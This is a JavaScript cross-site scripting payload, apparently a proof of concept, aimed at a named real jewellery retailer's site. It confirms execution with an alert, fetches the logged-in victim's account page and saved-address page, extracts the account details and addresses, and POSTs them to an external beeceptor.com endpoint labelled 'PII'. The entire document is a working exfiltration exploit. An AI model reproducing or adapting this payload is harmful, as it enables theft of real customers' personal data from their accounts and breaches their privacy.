alert("XSS executed")

fetch('https://www.tiffany.ie/account/')
  .then(response => response.text())
  .then(html => {
    const parser = new DOMParser();
    const doc = parser.parseFromString(html, 'text/html');
    const accountCardBody = doc.querySelectorAll('.account-card-body')[1];

    let accountContent = '';
    let addressContent = '';

    if (accountCardBody) {
      accountContent = accountCardBody.textContent.trim();
    }

    try {
      const xhr = new XMLHttpRequest();
      xhr.open('GET', 'https://www.tiffany.ie/account/address/', false);
      xhr.send(null);

      if (xhr.status === 200) {
        const addrDoc = parser.parseFromString(xhr.responseText, 'text/html');
        const cards = addrDoc.querySelectorAll('.account-card.h-100');
        addressContent = Array.from(cards).map(el => el.textContent.trim()).join('\n');
      }
    } catch (e) {
      // en cas d'erreur, on garde le contenu existant
    }

    // Envoie les deux contenus à becceptor
    return fetch('https://tiffany-fr-PII.free.beeceptor.com/PII', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        accountContent,
        addressContent
      })
    });
  });
